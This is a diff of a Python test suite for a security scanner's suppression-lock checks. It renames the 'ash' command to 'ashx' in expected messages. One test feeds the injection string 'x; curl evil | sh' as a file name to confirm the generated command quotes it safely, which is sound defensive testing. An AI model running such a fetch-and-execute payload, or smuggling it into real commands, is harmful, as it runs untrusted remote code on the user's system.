@@ -189,7 +189,7 @@ class TestRefusalWithoutALockEntry:
         with pytest.raises(ASHConfigValidationError) as caught:
             refuse_unlocked_symbol_suppressions([_symbol_suppression()], root)
         text = str(caught.value)
-        assert "ash suppress add B602 --symbol risky --file src/app.py" in text
+        assert "ashx suppress add B602 --symbol risky --file src/app.py" in text
         assert LOCK_RELATIVE_PATH in text
 
     def test_a_lock_entry_for_the_file_admits_it(self, tmp_path):
@@ -210,7 +210,7 @@ class TestRefusalWithoutALockEntry:
         monkeypatch.delenv("ASH_CONFIG", raising=False)
         root = _tree(tmp_path)
         config = _config_text(root, SYMBOL_ENTRY)
-        with pytest.raises(ASHConfigValidationError, match="ash suppress add"):
+        with pytest.raises(ASHConfigValidationError, match="ashx suppress add"):
             resolve_scan_config(config_path=config, source_dir=root)
         _lock(root, LockScope("B602", "risky"))
         resolved = resolve_scan_config(config_path=config, source_dir=root)
@@ -224,7 +224,7 @@ class TestRefusalWithoutALockEntry:
         config = _config_text(root, SYMBOL_ENTRY)
         check = ConfigValidator.check_config_file(config, source_dir=root)
         assert not check.scan_accepts
-        assert any("ash suppress add" in e for e in check.errors), check.errors
+        assert any("ashx suppress add" in e for e in check.errors), check.errors
         _lock(root, LockScope("B602", "risky"))
         assert ConfigValidator.check_config_file(config, source_dir=root).scan_accepts
 
@@ -242,10 +242,10 @@ class TestRefusalWithoutALockEntry:
         config = _config_text(root, SYMBOL_ENTRY)
         check = ConfigValidator.check_config_file(config)
         assert not check.scan_accepts
-        assert any("ash suppress add" in e for e in check.errors), check.errors
+        assert any("ashx suppress add" in e for e in check.errors), check.errors
         _lock(root, LockScope("B602", "risky"))
         after = ConfigValidator.check_config_file(config)
-        assert not any("ash suppress add" in e for e in after.errors), after.errors
+        assert not any("ashx suppress add" in e for e in after.errors), after.errors
 
     def test_an_unrecorded_scope_on_a_locked_file_is_refused(self, tmp_path):
         # The entry alone is not enough: once src/app.py was locked for
@@ -265,7 +265,7 @@ class TestRefusalWithoutALockEntry:
             root,
         )
         for rule_id, symbol in (("B605", "risky"), ("B602", "other")):
-            with pytest.raises(ASHConfigValidationError, match="ash suppress add"):
+            with pytest.raises(ASHConfigValidationError, match="ashx suppress add"):
                 refuse_unlocked_symbol_suppressions(
                     [
                         AshSuppression(
@@ -290,7 +290,7 @@ class TestRefusalWithoutALockEntry:
         orchestrator = ASHScanOrchestrator(
             source_dir=root, output_dir=tmp_path / "out", resolved_config=config
         )
-        with pytest.raises(ASHConfigValidationError, match="ash suppress add"):
+        with pytest.raises(ASHConfigValidationError, match="ashx suppress add"):
             orchestrator._initialize()
         _lock(root, LockScope("B602", "risky"))
         orchestrator._initialize()
@@ -303,9 +303,9 @@ class TestRefusalWithoutALockEntry:
         command = add_command_for("B602", "Handler.run", "x; curl evil | sh")
         parts = shlex.split(command)
         assert "x; curl evil | sh" in parts
-        assert parts[:3] == ["ash", "suppress", "add"]
+        assert parts[:3] == ["ashx", "suppress", "add"]
         plain = add_command_for("B602", "risky", "src/app.py")
-        assert "ash suppress add B602 --symbol risky --file src/app.py" in plain
+        assert "ashx suppress add B602 --symbol risky --file src/app.py" in plain
 
     def test_a_missing_entry_is_advised_the_drop_and_a_stale_one_the_refresh(
         self, tmp_path
@@ -316,10 +316,10 @@ class TestRefusalWithoutALockEntry:
         lock = _lock(root, LockScope("B602", "risky"))
         entry = lock.entries["src/app.py"]
         missing = stale_notice("src/app.py", entry, "missing")
-        assert "ash suppress refresh --drop-missing src/app.py" in missing
+        assert "ashx suppress refresh --drop-missing src/app.py" in missing
         assert "reported again" not in missing
         stale = stale_notice("src/app.py", entry, "stale")
-        assert "ash suppress refresh src/app.py" in stale
+        assert "ashx suppress refresh src/app.py" in stale
         assert "--drop-missing" not in stale
 
     def test_a_damaged_lock_is_refused_not_read_as_empty(self, tmp_path):
@@ -398,7 +398,7 @@ class TestInertOnMismatch:
         assert len(notices) == 1, notices
         assert "src/app.py" in notices[0]
         assert "B602 in risky" in notices[0]
-        assert "ash suppress refresh src/app.py" in notices[0]
+        assert "ashx suppress refresh src/app.py" in notices[0]
 
         lock = AshLock.load(root)
         old, new = lock.refresh("src/app.py")
@@ -467,7 +467,7 @@ class TestLockFile:
         root = _tree(tmp_path)
         lock = _lock(root, LockScope("B602", "risky"))
         (root / "src" / "app.py").write_text(SOURCE + "# edit\n", encoding="utf-8")
-        with pytest.raises(AshLockError, match="ash suppress refresh"):
+        with pytest.raises(AshLockError, match="ashx suppress refresh"):
             lock.bind("src/app.py", LockScope("B602", "other"))
 
 
@@ -505,7 +505,7 @@ class TestTheLockIsTheRootDotfile:
             r.getMessage() for r in caplog.records if "deprecated" in r.getMessage()
         ]
         assert len(notices) == 1, notices
-        assert ".ash/ash.lock" in notices[0] and "v4.0" in notices[0]
+        assert ".ash/ash.lock" in notices[0] and "v4.1" in notices[0]
         assert "git mv .ash/ash.lock .ash.lock" in notices[0]
         # The move alone: advising `ash suppress refresh` here re-approved
         # every unreviewed change in a stale legacy lock in one step.
